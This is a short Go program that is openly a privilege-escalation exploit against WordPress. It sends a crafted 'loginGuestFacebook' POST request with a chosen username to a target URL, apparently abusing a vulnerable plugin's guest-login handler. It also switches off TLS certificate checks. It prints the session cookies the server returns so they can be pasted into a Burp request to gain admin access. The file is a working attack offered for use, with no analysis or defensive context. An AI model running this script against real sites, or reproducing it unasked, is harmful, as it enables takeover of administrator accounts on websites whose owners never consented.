package main

import (
    "net/http"
    "net/url"
    "strconv"
    "strings"
    "log"
    "os"
    "crypto/tls"
)

func main() {

    targeturl := os.Args[1]
    user := os.Args[2]

    l := log.New(os.Stderr, "", 0)
    l.Println("[+] Starting Privilege Escalation on Wordpress")
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    data := url.Values{}
    data.Set("action", "loginGuestFacebook")
    data.Set("username", user)
    data.Set("email", "sth")

    exploitsignal := true
    client := &http.Client{}
    r, err := http.NewRequest("POST", targeturl, strings.NewReader(data.Encode())) 
    if err != nil {
        exploitsignal = false
        l.Println("[i] Exploit did not complete, target might not be vulnerable or check your connection")
    }
    r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
    r.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))

    res, err := client.Do(r)
    if err != nil {
        exploitsignal = false
        l.Println("[i] Exploit did not complete, check your connection")
    }

    if exploitsignal == true {
        l.Println("\n[+] Add these cookies to your burp request to get admin access:\n")
        for _, cookie := range res.Cookies() {
            l.Println("----------Set-Cookie:", cookie.Name)
        }
    } else {
        l.Println("[i] Exploit did not complete, server did not send vulnerable cookies")
	os.Exit(0)
    }


    defer res.Body.Close()
}
